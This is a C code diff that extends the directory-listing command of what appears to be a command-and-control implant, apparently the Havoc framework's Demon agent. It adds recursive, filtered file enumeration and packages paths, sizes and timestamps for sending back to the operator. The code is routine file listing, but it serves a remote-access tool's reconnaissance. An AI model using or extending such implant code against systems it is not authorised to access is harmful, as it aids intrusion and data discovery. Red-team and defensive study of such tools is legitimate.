@@ -688,83 +688,94 @@ VOID CommandFS( PPARSER Parser )
     {
         case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
         {
-            WIN32_FIND_DATAW FindData      = { 0 };
-            LPWSTR           Path          = NULL;
-            UINT32           PathSize      = 0;
-            WCHAR            T[ MAX_PATH ] = { 0 };
-            HANDLE           hFile         = NULL;
-            ULARGE_INTEGER   FileSize      = { 0 };
-            SYSTEMTIME       FileTime      = { 0 };
-            SYSTEMTIME       SystemTime    = { 0 };
-            DWORD            Return        = 0;
-            BOOL             FileExplorer  = FALSE;
+            WIN32_FIND_DATAW FindData     = { 0 };
+            LPWSTR           TargetFolder = NULL;
+            LPWSTR           Path         = NULL;
+            BOOL             FileExplorer = FALSE;
+            PROOT_DIR        RootDir      = NULL;
+            PROOT_DIR        TmpRootDir   = NULL;
+            BOOL             SubDirs      = FALSE;
+            BOOL             FilesOnly    = FALSE;
+            BOOL             DirsOnly     = FALSE;
+            BOOL             ListOnly     = FALSE;
+            LPWSTR           Starts       = NULL;
+            LPWSTR           Contains     = NULL;
+            LPWSTR           Ends         = NULL;
+            PDIR_OR_FILE     DirOrFile    = NULL;
+            PDIR_OR_FILE     TmpDirOrFile = NULL;
 
-            FileExplorer     = ParserGetInt32( Parser );
-            Path             = ParserGetWString( Parser, &PathSize );
+            FileExplorer = ParserGetBool( Parser );
+            TargetFolder = ParserGetWString( Parser, NULL );
+            SubDirs      = ParserGetBool( Parser );
+            FilesOnly    = ParserGetBool( Parser );
+            DirsOnly     = ParserGetBool( Parser );
+            ListOnly     = ParserGetBool( Parser );
+            Starts       = ParserGetWString( Parser, NULL );
+            Contains     = ParserGetWString( Parser, NULL );
+            Ends         = ParserGetWString( Parser, NULL );
 
-            PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
-            PRINTF( "Path        : %ls\n", Path )
+            Starts   = Starts[ 0 ]   ? Starts   : NULL;
+            Contains = Contains[ 0 ] ? Contains : NULL;
+            Ends     = Ends[ 0 ]     ? Ends     : NULL;
 
-            PackageAddInt32( Package, FileExplorer );
+            Path = Instance.Win32.LocalAlloc( LPTR, MAX_PATH * sizeof( WCHAR ) );
 
-            if ( Path[ 0 ] == L'.' )
+            if ( TargetFolder[ 0 ] == L'.' )
             {
-                if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, T ) ) )
+                if ( ! Instance.Win32.GetCurrentDirectoryW( MAX_PATH, Path ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
+                    break;
                 }
-                else
-                    PackageAddWString( Package, T );
+
+                StringConcatW( Path, L"*" );
             }
             else
             {
-                PackageAddWString( Package, Path );
+                MemCopy( Path, TargetFolder, MAX_PATH * sizeof( WCHAR ) );
             }
 
-            MemSet( &FindData, 0, sizeof( FindData ) );
+            PRINTF( "Path: %ls\n", Path )
 
-            hFile = Instance.Win32.FindFirstFileW( Path, &FindData );
-            if ( hFile == INVALID_HANDLE_VALUE )
+            RootDir = listDir( Path, SubDirs, FilesOnly, DirsOnly, Starts, Contains, Ends );
+
+            PackageAddBool( Package, FileExplorer );
+            PackageAddBool( Package, ListOnly );
+            PackageAddWString( Package, Path );
+            PackageAddBool( Package, RootDir ? TRUE : FALSE );
+
+            while ( RootDir )
             {
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                Instance.Win32.FindClose( hFile );
+                PackageAddWString( Package, RootDir->Path );
+                PackageAddInt32( Package, RootDir->NumFiles );
+                PackageAddInt32( Package, RootDir->NumFolders );
+                PackageAddInt64( Package, RootDir->TotalFileSize );
 
-                PUTS( "LEAVE" )
-                goto CLEAR_LEAVE;
-            }
-
-            do
-            {
-                Instance.Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &FileTime );
-                Instance.Win32.SystemTimeToTzSpecificLocalTime( 0, &FileTime, &SystemTime );
-
-                if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
+                DirOrFile = RootDir->Content;
+                while ( DirOrFile )
                 {
-                    PackageAddInt32( Package, TRUE );
-                    PackageAddInt64( Package, 0 );
-                }
-                else
-                {
-                    FileSize.HighPart = FindData.nFileSizeHigh;
-                    FileSize.LowPart  = FindData.nFileSizeLow;
+                    PackageAddWString( Package, DirOrFile->FileName );
+                    PackageAddBool( Package, DirOrFile->IsDir );
+                    PackageAddInt64( Package, DirOrFile->Size );
+                    PackageAddInt32( Package, DirOrFile->FileTime.wDay );
+                    PackageAddInt32( Package, DirOrFile->FileTime.wMonth );
+                    PackageAddInt32( Package, DirOrFile->FileTime.wYear );
+                    PackageAddInt32( Package, DirOrFile->SystemTime.wMinute );
+                    PackageAddInt32( Package, DirOrFile->SystemTime.wHour );
 
-                    PackageAddInt32( Package, FALSE );
-                    PackageAddInt64( Package, FileSize.QuadPart );
+                    TmpDirOrFile = DirOrFile->Next;
+                    DATA_FREE( DirOrFile, sizeof( DIR_OR_FILE ) );
+                    DirOrFile = TmpDirOrFile;
                 }
 
-                PackageAddInt32( Package, FileTime.wDay );
-                PackageAddInt32( Package, FileTime.wMonth );
-                PackageAddInt32( Package, FileTime.wYear );
-                PackageAddInt32( Package, SystemTime.wSecond );
-                PackageAddInt32( Package, SystemTime.wMinute );
-                PackageAddInt32( Package, SystemTime.wHour );
-                PackageAddWString( Package, FindData.cFileName );
+                TmpRootDir = RootDir->Next;
+                DATA_FREE( RootDir, sizeof( ROOT_DIR ) );
+                RootDir = TmpRootDir;
             }
-            while ( Instance.Win32.FindNextFileW( hFile, &FindData ) );
 
-            PUTS( "Close File Handle" )
-            Instance.Win32.FindClose( hFile );
+            DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
 
             break;
         }
